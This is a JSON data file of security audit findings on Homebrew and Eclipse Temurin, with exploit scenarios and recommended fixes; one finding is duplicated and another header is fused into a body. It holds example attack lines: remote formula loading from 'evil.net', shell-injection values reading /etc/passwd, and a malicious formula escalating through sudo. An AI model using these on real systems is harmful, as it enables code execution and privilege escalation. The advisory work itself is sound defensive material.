        "body": "There is a lack of sandboxing at all on Linux. # typed: strict # frozen_string_literal: true require \"extend/os/mac/sandbox\" if OS.mac? Figure 10.1: Sandbox implemented only for MacOS Exploit Scenario Packages built for Linux may intentionally or unintentionally overwrite other les on the system, which can potentially allow packages to clobber each other or compromise the CI system building Linux packages, especially in the case of self-hosted Linux-based runners. Recommendations Homebrew should implement a basic Linux sandbox using either bubblewrap, nsjail, or some other lightweight, namespace-based Linux sandboxing mechanism.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Sandbox escape through domain socket pivot on macOS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "On macOS, some sandboxes may be created with special exceptions for various system and Homebrew-specic temporary directories: def allow_write_temp_and_cache allow_write_path \"/private/tmp\" allow_write_path \"/private/var/tmp\" allow_write \"^/private/var/folders/[^/]+/[^/]+/[C,T]/\", type: :regex allow_write_path HOMEBREW_TEMP allow_write_path HOMEBREW_CACHE end Figure 11.1: Sandbox exceptions for temporary directories on macOS In particular, allow_write_temp_and_cache is used in both the build and post_install phases of formula installation: sandbox = Sandbox.new formula.logs.mkpath sandbox.record_log(formula.logs/\"postinstall.sandbox.log\") sandbox.allow_write_temp_and_cache sandbox.allow_write_log(formula) Figure 11.2: Sandbox exceptions during post-install The system temporary directories excepted under these rules typically contain Unix domain sockets for running services, which in turn can be written to. Depending on the services being used, a malicious formula may be able to perform a sandbox escape by connecting to one of these domain sockets and sending service-specic information to be interpreted as system commands, instructions to perform I/O, etc. Exploit Scenario A targeted user has tmux, a popular terminal multiplexer, installed. tmux runs as a background daemon with multiple connecting clients, servicing connections through a domain socket typically exposed at /private/tmp/tmux-${UID}, where ${UID} is the running users numeric identier. Any process that can write to this domain socket can send commands to tmux, including the send-keys command, which is capable of running arbitrary shell commands. To perform a sandbox escape, an attacker discovers useful domain sockets (like tmux) in the temporary directories that the sandbox has access to. Using tmux as an example, they then send commands through the socket, causing the tmux daemon (or a subprocess of the daemon) to run arbitrary commands or perform I/O outside of the sandbox. This attack requires the target to be running an independent service or daemon that exposes a socket via a system temporary directory. However, this is a common conguration (such as with tmux by default). Recommendations Short-term, evaluate the ability of the macOS sandbox rules to further restrict Unix domain socket access in these directories. In particular, the network-outbound rule may be able to perform restrictions on unix-socket patterns. Long term, consider eliminating these paths from the sandboxed processes entirely, and instead inject TMPDIR and similar environment variables that point to an entirely Homebrew-controlled temporary directory (such as a dedicated one under HOMEBREW_TEMP).",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Formula privilege escalation through sudo ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Formula denitions can run commands as the root user using sudo --non-interactive, assuming that the user has used sudo earlier in the shell history. Exploit Scenario The following gure shows an example of a malicious package that can take advantage of this issue: # privilegeEscalation.rb class Privilegeescalation < Formula url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"GPL-3.0-or-later\" def install ENV.append \"LDFLAGS\", \"-liconv\" if OS.mac? system \"./configure\", \"--disable-dependency-tracking\", \"--disable-silent-rules\", \"--prefix=#{prefix}\" system \"make\", \"install\" end end system \"sudo\", \"--non-interactive\", \"touch\", \"/tmp/pwned\" Figure 12.1: Sandbox implemented only for MacOS Here is what happens when this package is installed: $ sudo do_unrelated_thing Password: ... ... $ brew install ./privilegeEscalation.rb ... $ ls -l /tmp/pwned -rw-r--r-- 1 root wheel 0 Aug 25 11:54 /tmp/pwned Figure 12.2: Installing the malicious package Recommendations Run sudo -k whenever a third-party (i.e., outside of Homebrew core) formula denition le is about to be read, and in general whenever untrusted code is about to be executed.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Formula loading through SFTP, SCP, and other protocols ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew allows loading of formulae by path or by file:// URL, but explicitly forbids arbitrary loading via other protocols (such as HTTP/HTTPS and FTP): def load_file(flags:, ignore_errors:) match = url.match(%r{githubusercontent.com/[\\w-]+/[\\w-]+/[a-f0-9]{40}(?:/Formula)?/(?<name>[ \\w+-.@]+).rb}) if match raise UnsupportedInstallationMethod, \"Installation of #{match[:name]} from a GitHub commit URL is unsupported! \" \\ \"`brew extract #{match[:name]}` to a stable tap on GitHub instead.\" elsif url.match?(%r{^(https?|ftp)://}) raise UnsupportedInstallationMethod, \"Non-checksummed download of #{name} formula file from an arbitrary URL is unsupported! \" \\ \"`brew extract` or `brew create` and `brew tap-new` to create a formula file in a tap \" \\ \"on GitHub instead.\" Figure 13.1: Restrictions on downloads of formulae from arbitrary URLs However, Homebrews current checks are limited to HTTP(s) and FTP, while curl (the underlying download handler) is typically built with support for additional protocols, including SFTP, SCP, IMAP, and FTPS. Consequently, an attacker is able to induce Homebrew into loading a remotely specied formula (and executing its contents) via a URL for one of these protocols: brew install sftp://evil.net/~/malicious.rb Figure 13.2: Installation from an SFTP URL Exploit Scenario An attacker may use this remote loading vector as a pivoting technique: there may be situations where Homebrew assumes that the arguments to brew install (and similar commands) all represent locally installed formulae that are trusted by the user, when in reality an attacker may be able to introduce a remote formula that gets loaded and executed unexpectedly. Recommendations We recommend that Homebrew perform formula argument sanitization through a deny-by-default strategy, i.e. rejecting anything that is not an ordinary formula name, local path, or file:// URL by default, rather than attempting to enumerate specic protocols to reject.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. Sandbox allows changing permissions for important directories ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "The sandbox allows a formula build, post-install, and test step to change the permissions of the brew cache directory. class ChmodTest < Formula desc \"\" homepage \"\" url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" version \"0.0.0\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"MIT\" def install system \"chmod\", \"ug-w\", \"/Users/user/Library/Caches/Homebrew\" # system \"chmod\", \"777\", \"/Users/user/test_file\" # this gets blocked end test do system \"false\" end end Figure 14.1: Sample formula that changes directory permissions Exploit Scenario Given the ability to add or remove permissions in unexpected brew directories, a formula either makes les or directories too permissive or not permissive enough, thus preventing les from being read, written, created, or deleted. Recommendations Homebrew should use the sandbox to ensure that formulas do not change the permissions of unexpected les or directories, especially directories important to brew. This is governed by the file-write-mode sandbox operation. 15. Homebrew supports only end-of-life versions of Ruby Severity: Informational Diculty: Undetermined Type: Patching Finding ID: TOB-BREW-15 Target: All of Homebrew",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Path traversal during bottling ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "There is a path traversal during the execution of the brew bottle command that allows for the output le to be put into a dierent directory. However, this is most likely impossible to exploit, since any package trying to exploit this would have an invalid location for the packages keg and thus could not be bottled in the rst place. The following pieces of code are used to decide where to put the output from brew bottle: filename = Bottle::Filename.create(formula, bottle_tag.to_sym, rebuild) local_filename = filename.to_s bottle_path = Pathname.pwd/filename Figure 16.1: Denition of bottle_path (brew/Library/Homebrew/dev-cmd/bottle.rb:356358) sig { returns(String) } def to_s \"#{name}--#{version}#{extname}\" end alias to_str to_s Figure 16.2: Code used in Bottle::Filename to calculate bottle_path as a string (brew/Library/Homebrew/software_spec.rb:306310) By maliciously setting the name or version of a package, an attacker could cause the bottle_path to contain a path traversal, placing the output le in a dierent directory than intended. Recommendations Short term, remove any special characters from the name and version before using it when creating the bottle_path. Preferably, also disallow formulas from having these special characters in their version names in the rst place (see TOB-BREW-4). Long term, audit any uses of user-inputted strings to create paths. Ensure that the input is properly sanitized before being used.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. FileUtils.rm_rf does not check if les are deleted ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "When using FileUtils.rm_rf, Ruby masks all errors, not just le not found errors, which can be surprising. This can mask issues that prevent the le or directory from being deleted. # Removes the entry given by +path+, # which should be the entry for a regular file, a symbolic link, # or a directory. # # Argument +path+ # should be {interpretable as a path}[rdoc-ref:FileUtils@Path+Arguments]. # # Optional argument +force+ specifies whether to ignore # raised exceptions of StandardError and its descendants. # # Related: FileUtils.remove_entry_secure. # def remove_entry(path, force = false) Entry_.new(path).postorder_traverse do |ent| begin ent.remove rescue raise unless force end end rescue raise unless force end module_function :remove_entry Figure 17.1: Ruby implementation of remove_entry A number of places in the code are worth double checking to ensure that ignoring all errors related to deletion is intentional. Figure 17.2 shows some examples. def cleanup_bottle_etc_var(formula) bottle_prefix = formula.opt_prefix/\".bottle\" # Nuke etc/var to have them be clean to detect bottle etc/var # file additions. Pathname.glob(\"#{bottle_prefix}/{etc,var}/**/*\").each do |bottle_path| prefix_path = bottle_path.sub(bottle_prefix, HOMEBREW_PREFIX) FileUtils.rm_rf prefix_path end end def verify_local_bottles with_env(HOMEBREW_DISABLE_LOAD_FORMULA: 1) do  # Delete these files so we don't end up uploading them. files_to_delete = mismatched_checksums.keys + unexpected_bottles files_to_delete += files_to_delete.select(&:symlink?).map(&:realpath) FileUtils.rm_rf files_to_delete test \"false\" # ensure that `test-bot` exits with an error. false end end Figure 17.2: cleanup_bottle_etc_var and verify_local_bottles found in homebrew-test-bot/lib/tests/formulae.rb Exploit Scenario Code that assumes the absence of specic les or directories may have that assumption violated. An attacker can potentially induce this issue using TOB-BREW-14, which allows formulas to change the permissions of certain brew directories. Recommendations Short term, we recommend auditing all usages of FileUtils.rm_rf to ensure that it is safe to continue if the le or directory deletion does not succeed in removing the expected items. Long term, we recommend creating a helper that ignores ENOENT but raises on other potential errors that may occur when deleting les or directories.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "18. Use of pull_request_target in GitHub Actions workows ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "The vendor-gems and vendor-node-modules workows both declare pull_request_target as a trigger, allowing third-party pull requests to run code within the context of the targeted (i.e., upstream) repository: name: Vendor Gems on: pull_request: paths: - Library/Homebrew/dev-cmd/vendor-gems.rb - Library/Homebrew/Gemfile* push: paths: - .github/workflows/vendor-gems.yml branches-ignore: - master pull_request_target: workflow_dispatch: inputs: pull_request: description: Pull request number required: true Figure 18.1: Workow triggers for vendor-gems.yml name: Vendor node_modules on: pull_request_target: types: - labeled workflow_dispatch: inputs: pull_request: description: Pull request number required: true Figure 18.2: Workow triggers for vendor-node-modules.yml Because pull_request_target allows arbitrary third-party PRs to run arbitrary code in the context of the target repository, it is considered dangerous and generally discouraged by GitHub. GitHub particularly cautions against the use of pull_request_target in any context where an attacker may be able to induce npm install or a similar vector for arbitrary code execution, which is the primary purpose for both vendor-gems.yml and vendor-node-modules.yml. Both workows contain partial mitigations against the risks of pull_request_target. vendor-gems.yml appears to ignore the event unless it comes from an ostensibly trusted user (dependabot[bot], indicating GitHubs Dependabot): jobs: vendor-gems: if: > github.repository_owner == 'Homebrew' && ( github.event_name == 'workflow_dispatch' || github.event_name == 'pull_request' || github.event_name == 'push' || ( github.event.pull_request.user.login == 'dependabot[bot]' && contains(github.event.pull_request.title, '/Library/Homebrew') ) ) Figure 18.3: Event ltering in vendor-gems.yml vendor-node-modules.yml uses the labeled sub-lter to restrict the workow to only pull requests that have been explicitly labeled with a safe label by a reviewer. Regardless, both workows run arbitrary code via package management steps, meaning that a malicious or compromised package may be able to run arbitrary code in each workows respective repository (including access to repository secrets and other sensitive materials). Exploit Scenario Scenario 1: A compromised RubyGem or Node package inspects its running environment, determines that it is executing in the context of a pull_request_target, and exltrates environment variables or other secrets (or potentially runs code in the context of the trusted repository, establishing persistence). Scenario 2: The labeled sub-lter for pull_request_target is subject to race conditions, allowing an attacker to push new changes after a workow has been labeled (indicating trust and approval) but has not yet been picked up by a workow runner. Recommendations Short term, we recommend that the Homebrew maintainers conduct a review of these workows and determine what, if any, further lters and restrictions can be applied to their pull_request_target triggers. In particular, we recommend that both be fully restricted to dependabot[bot] or similar trusted account identities, that both enforce labeling, and that neither exposes unnecessary permissions or secrets. Long term, we recommend that Homebrew refactor these workows to avoid pull_request_target entirely. In particular, we recommend that Homebrew consider automation ows that use only safer triggers like pull_request, or that workows use a comment-based ow to enable trusted users to trigger modications to PRs.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Use of unpinned third-party workow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Workows throughout the Homebrew repositories make direct use of the third-party ruby/setup-ruby@v1 workow. The following example occurs in review-cask-pr.yml: - name: Set up Ruby uses: ruby/setup-ruby@v1 with: ruby-version: '2.6' Figure 19.1: Use of ruby/setup-ruby@v1 in review-cask-pr.yml Git tags are malleable. This means that, while ruby/setup-ruby is pinned to v1, the upstream may silently change the reference pointed to by v1. This can include malicious re-tags, in which case Homebrews various dependent workows will silently update to the malicious workow. GitHubs security hardening guidelines for third-party actions encourage developers to pin third-party actions to a full-length commit hash. Generally excluded from this is ocial actions under the actions org; however, setup-ruby is not an ocial action. Specically aected workows include:  homebrew-actions/.github/workflows/review-cask-pr.yml  formulae.brew.sh/.github/workflows/scheduled.yml  formulae.brew.sh/.github/workflows/tests.yml  brew/.github/workflows/docs.yml  homebrew-test-bot/.github/workflows/tests.yml Exploit Scenario An attacker (or compromised maintainer) may silently overwrite the v1 tag on ruby/setup-ruby with a malicious version of the action, causing a large number of security-sensitive Homebrew workows to run malicious code. Recommendations Short term, we recommend that Homebrew replace the current v1 tag on each use of ruby/setup-ruby with a full-length commit hash corresponding to the revision that each workow is intended to use. Longer term, we recommend that Homebrew leverage Dependabots support for GitHub Actions to keep these hashes up to date (complemented by maintainer reviews).",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Unpinned dependencies in formulae.brew.sh ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "formulae.brew.sh is rendered by Jekyll, and species its dependencies in a top-level Gemfile: gem \"faraday-retry\" gem \"jekyll\" gem \"jekyll-redirect-from\" gem \"jekyll-remote-theme\" gem \"jekyll-seo-tag\" gem \"jekyll-sitemap\" gem \"rake\" Figure 20.1: Excerpted dependencies in formulae.brew.shs Gemfile Notably, all current dependencies for the sites build are currently unpinned. Combined with the absence of a Gemfile.lock, this means that every re-build of the site potentially installs dierent (and new) versions of each dependency. Prior to formulae.brew.shs hosting of Homebrews JSON formula API, the sites security prole was minimal. However, now that formulae.brew.sh serves as the source of truth for installable formulae, its security prole is substantial. Consequently, all dependencies used to build the site should be fully pinned to minimize the risk of downstream compromise or package takeover. Exploit Scenario An attacker who manages to take over or compromise one of formulae.brew.shs dependencies may be able to execute arbitrary code during the sites generation and deployment, including:  Potentially stealing or maliciously using the current JSON API signing key, resulting in a total compromise of bottle integrity and authenticity;  Defacing or maliciously modifying the Homebrew website (e.g. to include malicious recommendations for users) Even without access to the signing key, an attacker may be able to perform a downgrade attack on Homebrew users by forcing the JSON API to serve an older copy of the signed JSON response, resulting in downstream users installing older, vulnerable copies of formulae. Recommendations Short term, we recommend that Homebrew apply version pins to each dependency specied in formulae.brew.shs Gemfile. Additionally, we recommend that Homebrew check an equivalent Gemfile.lock into the source tree, providing additional integrity to the version pins. Long term, we recommend that Homebrew use Dependabot to track updates to the Gemfile-specied dependencies and, with maintainer review, perform all updates through Dependabot. We also recommend that Homebrew evaluate each dependencys maintenance status and importance and, if possible, eliminate as many as possible as part of a larger eort to reduce the overall external security prole of formulae.brew.sh.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "21. Use of RSA for JSON API signing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew currently signs all JSON API responses using an RSA key, using the RSA-PSS signing scheme with SHA512 as the cryptographic digest and mask generation function. signature_data = Base64.urlsafe_encode64( PRIVATE_KEY.sign_pss(\"SHA512\", signing_input, salt_length: :digest, mgf1_hash: \"SHA512\") ) Figure 21.1: RSA-PSS signature generation in sign-json.rb Homebrew currently uses a 4096-bit RSA key, and RSA-PSS is a well-studied, strong instantiation of an RSA signing scheme with a formal security proof. At the same time, RSA is a dangerous cryptosystem that reects historical constraints, exposes excessive parameters to the key-generating party, and produces larger signatures than corresponding security margins in other cryptosystems. Exploit Scenario We conducted a review of Homebrews current signing key and found that it uses a reasonable public exponent (e = 65537) and has a substantial security margin (4096 bits, equivalent to greater than 128 bits of symmetric security). Combined with Homebrews use of RSA-PSS, we believe that the current use of RSA does not represent a substantial risk to Homebrews JSON API signatures. As such, this is a purely informational nding. Recommendations We recommend no short or medium-term actions. Long term, we recommend that Homebrews next key rotation replace RSA and RSA-PSS with an ECC key and ECDSA (or EdDSA, if client support permits). ECC keys and signatures are substantially smaller than their RSA equivalents with comparable security margins and have fewer user-controlled parameters.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "22. Bottles beginning - can lead to unintended options getting passed to rm ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "If a bottle contains a -, this may lead to unintended options getting passed to rm. - run: rm -rvf *.bottle*.{json,tar.gz} Figure 22.1: Potentially buggy workow Exploit Scenario This is very unlikely to be exploitable but may produce some surprising behavior when combined with TOB-BREW-4. Recommendations We recommend changing the workow to use the following. - run: rm -rvf -- *.bottle*.{json,tar.gz} Figure 22.2: A possible solution to the buggy workow We also recommend running actionlint on the other repos besides just Homebrew/brew as noted in appendix C.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "23. Code injection through inputs in multiple actions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew/homebrew-actions contains a wide variety of utility actions used throughout the Homebrew project. Many of these actions have congurable inputs, allowing their calling workows and users to supply values/relevant pieces of state. In many cases, these inputs are treated as variables, and expanded directly into shell or Ruby expressions using GitHub Actions ${{ .. }} expansion syntax: steps: - run: brew bump --open-pr --formulae ${{ inputs.formulae }} if: inputs.formulae != '' shell: sh env: HOMEBREW_DEVELOPER: \"1\" HOMEBREW_GITHUB_API_TOKEN: ${{inputs.token}} Figure 23.1: An example of an input expansion in homebrew-actions/bump-packages However, performing blind expansions of potentially user-controlled inputs like this is dangerous, as GitHubs ${{  }} expansion syntax performs no quoting or escaping of the expanded value. Consequently, an attacker may leverage an action input to perform a shell injection: inputs.formulae may be contrived to contain foo; cat /etc/passwd, resulting in brew bump --open-pr --formulae foo; cat /etc/passwd being run by the surrounding workow. This pattern appears widely in the actions dened under homebrew-actions. The following (not guaranteed to be exhaustive) list of actions contains at least one potentially user-controlled code injection through inputs:  bump-formulae  bump-packages  count-bottles  failures-summary-and-bottle-result  find-related-workflow-run-id  pre-build  setup-commit-signing The impact of these varies by action and by each actions workow usage, including relevant workow triggers. In the worst-case scenario, an action may be used by a workow that takes entirely PR-controlled inputs, allowing an untrusted PR to make changes to the workows behavior surreptitiously. Exploit Scenario Depending on how these actions are applied to their respective workows, an attacker may be able to execute arbitrary shell or Ruby code in the context of a workow step that is otherwise constrained to an expected set of operations. These expansions may also allow a maintainer with limited privileges (e.g., the ability to manually dispatch some workows) to pivot to greater privileges by injecting arbitrary code into those workows. Recommendations Generally speaking, any ${{  }} expansion in a shell or other executable context can be rewritten into an injection-free form through the use of environment variables. For example, the following: - run: ./count.sh '${{ inputs.working-directory }}' '${{ inputs.debug }}' working-directory: ${{ github.action_path }} shell: bash id: count Figure 23.2: Two potentially input unsafe expansions Could be rewritten as: - run: ./count.sh ${INPUT_WORKING_DIRECTORY} ${INPUT_DEBUG} working-directory: ${{ github.action_path }} shell: bash id: count env: INPUT_WORKING_DIRECTORY: ${{ inputs.working-directory }} INPUT_DEBUG: ${{ inputs.debug }} Figure 23.3: Unsafe expansions rewritten to use environment variables",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "24. Use of PGP for commit signing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "The current setup-commit-signing action uses a PGP key: git config --global user.signingkey $GPG_KEY_ID git config --global commit.gpgsign true Figure 24.1: PGP key conguration in setup-commit-signing PGP is a generally dated and insecure cryptographic ecosystem: while individual applications of PGP can be secure, its overall complexity, insecure defaults, and kitchen sink design is generally a poor t for modern applications, including digital signatures on Git commits. Git has supported commit signing with SSH keys since Git 2.34 (released in 2021), and GitHub has supported SSH commit verication since 2022. This allows users to fully replace their PGP signing key with an SSH signing key, which in turn provides more modern defaults in a smaller overall cryptographic package (meaning a reduced attack surface). Recommendations We make no immediate or medium-term recommendations for this nding. In the long term, we recommend that Homebrew consider replacing its current commit signing key with an SSH-based signing key. In particular, we recommend that Homebrew use an SSH-based Ed25519 key, given its widespread support in both the SSH and Git ecosystems.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "7. Use of ldd on untrusted inputs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "On Linux, Homebrew uses ldd to list the dynamic dependencies of an executable (i.e., the shared libraries that it declares as dependencies): ldd = DevelopmentTools.locate \"ldd\" ldd_output = Utils.popen_read(ldd, path.expand_path.to_s).split(\"\\n\") Figure 7.1: Using ldd to collect shared object dependencies This metadata is produced for all ELF les in a binary, as part of providing the Linux equivalent of Homebrew-on-Rubys binary relocation functionality. Running ldd can result in arbitrary code execution when a binary has a custom ELF interpreter specied. This may allow a malicious bottle to run arbitrary code outside of the context of the installing sandbox (since relocation is not sandboxed) with relative stealth (since no code is obviously executed). Exploit Scenario An attacker contrives an ELF binary with a custom .interp section, enabling arbitrary code execution. This execution occurs surreptitiously during Homebrews binary relocation phase, before the user expects any formula-provided executables to run. Recommendations Short term, Homebrew can check an ELFs interpreter (in the .interp section) before loading it with ldd and, if it appears to be a non-standard interpreter, refuse to handle it. Long term, Homebrew can replace ldd with similar inspection tools, such as readelf or objdump. Both are capable of collecting a binarys dynamic linkages without arbitrary code execution.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Formulas allow for external resources to be downloaded during the install step ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "If a package downloads external resources during the install phase of the process, the integrity of the les is never validated by brew itself. This could lead to a case where the upstream resource is changed unexpectedly or maliciously, which could also aect the reproducibility of the build. class InstallNetwork < Formula desc \"\" homepage \"\" url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" version \"0.0.0\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"\" def install system \"curl\", \"-L\", \"-o\", \"#{prefix}/build.sh\", \"https://example.com/files/build.sh\" end test do system \"false\" end end Figure 8.1: Example formula that downloads unveried external resources Exploit Scenario An attacker takes over an unveried upstream resource and injects malicious code into a brew bottle while it is being built. Recommendations Short term, Homebrew should check that no existing packages download unexpected resources over the network that are not explicitly declared. Long term, Homebrew should pre-download the extra required resources, (after verifying their integrity in an earlier step) and sandbox network requests in the build/post-install stage. This will ensure that packages do not inadvertently download resources.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Sandbox allows changing permissions for important directories ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "The sandbox allows a formula build, post-install, and test step to change the permissions of the brew cache directory. class ChmodTest < Formula desc \"\" homepage \"\" url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" version \"0.0.0\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"MIT\" def install system \"chmod\", \"ug-w\", \"/Users/user/Library/Caches/Homebrew\" # system \"chmod\", \"777\", \"/Users/user/test_file\" # this gets blocked end test do system \"false\" end end Figure 14.1: Sample formula that changes directory permissions Exploit Scenario Given the ability to add or remove permissions in unexpected brew directories, a formula either makes les or directories too permissive or not permissive enough, thus preventing les from being read, written, created, or deleted. Recommendations Homebrew should use the sandbox to ensure that formulas do not change the permissions of unexpected les or directories, especially directories important to brew. This is governed by the file-write-mode sandbox operation.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Homebrew supports only end-of-life versions of Ruby ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew currently expects to be run under Ruby 2.6, which was declared end-of-life (EOL) by the Ruby maintainers in April 2022. Newer versions of Ruby that have not yet reached EOL are considered unsupported by Homebrew, and are not yet available through homebrew-portable-ruby. Exploit Scenario This is a purely informational nding; although unpatched CVEs exist for Ruby 2.6 and other EOL Ruby versions, the Homebrew maintainers do not consider these CVEs relevant to Homebrews use of Ruby. Homebrews maintainers have indicated that they intend to upgrade Homebrew to Ruby 3.2, putting them on a version of Ruby that is receiving security updates. Recommendations We recommend that Homebrew upgrade to Ruby 3.2.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "25. Unnecessary domain separation between signing key and key ID ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrews JSON API includes JSON Web Signature-formatted signatures. These signatures include (unauthenticated) metadata designed to assist the verifying party, including a key identier intended to accelerate lookup when multiple public keys are being considered. In Homebrews case, the current one and only signing key is identied by the homebrew-1 identier, which is matched against during signature verication: homebrew_signature = signatures&.find { |sig| sig.dig(\"header\", \"kid\") == \"homebrew-1\" } Figure 25.1: Searching for a signature that designates homebrew-1 as its signing key The use of a human-readable key identier (homebrew-1) results in domain separation between the signing key and its identier: nothing positively binds the identier to the signing key other than shared convention. This can (but does not always) become a source of confusion in situations with multiple keys, and can (but does not always) allow attackers to substitute older keys or unexpected verication materials. One typical technique for eliminating this domain separation is to take a strong cryptographic digest of each public key (canonicalized in some standard format, such as the DER encoding of the subjectPublicKeyInfo representation) and use that digest as the key identier. This ensures that a given public key has only one tightly bound identier. Recommendations Preventing domain separation here addresses a theoretical concern; we make no specic short- or medium-term recommendations. Long-term, we recommend that the Homebrew maintainers consider enforcing that key identiers are strongly bound to their public keys, e.g. by dening a keys identier as the SHA-256 digest of the keys DER-encoded subjectPublicKeyInfo representation (or any other stable, canonical representation). A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "1. Command injection vulnerability in WinRM script ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-12-eclipse-temurin-securityreview.pdf",
        "body": "The run_winrm function allows callers to specify commands to run on a Vagrant virtual machine (VM). It is the primary functionality of the startScriptWin.py script, which is itself executed by the vagrantPlaybookCheck.sh shell script. This function receives input from command-line arguments and uses string concatenation to build a shell command to execute on a Vagrant VM: def run_winrm (vmIP, buildArgs , mode): cmd_str = \"Start-Process powershell.exe -Verb runAs; cd C:/tmp; sh C:/vagrant/pbTestScripts/\" print (mode) if mode == 1 : cmd_str += \"buildJDKWin.sh \" else : cmd_str += \"testJDKWin.sh \" cmd_str += buildArgs print ( \"Running : session = winrm.Session( str (vmIP), auth=( 'vagrant' , 'vagrant' )) session.run_ps(cmd_str, sys.stdout, sys.stderr) %s \" %cmd_str) Figure 1.1: A shell command generated with string concatenation ( infrastructure/ansible/pbTestScripts/startScriptWin.py:1222 ) If an attacker can inuence the buildArgs parameter, either through the startScriptWin.py or vagrantPlaybookCheck.sh command-line arguments, then they could be able to execute code on the Vagrant VM. The Eclipse Foundation has conrmed that these parameters can be specied in a Jenkins job web form; however, access to these forms is restricted. Exploit Scenario An attacker sends a malicious shell payload through the --build-fork or --build-branch command-line argument to vagrantPlaybookCheck.sh , or through the -a command-line argument to startScriptWin.py . While building the cmd_str , the 17 OSTIF Eclipse: Temurin Security Assessment run_winrm function concatenates the buildArgs string and executes it on the Vagrant VM. The attacker is able to execute arbitrary commands by using shell operators such as ; , && , or || , and to append additional commands. It is worth noting that spaces cannot be used in the payload if it is sent to vagrantPlaybookCheck.sh . However, shell brace expansion can be used to bypass this restriction. For example, the following command results in successful command injection: ./vagrantPlaybookCheck.sh ... --branch main;{echo,command,injection}; ... Recommendations Short term, build a list of command arguments to be passed to the run_winrm method instead of using string concatenation to generate a command argument string and passing it to run_ps . Long term, implement static analysis rules to automatically detect string concatenation data that is passed to the run_ps 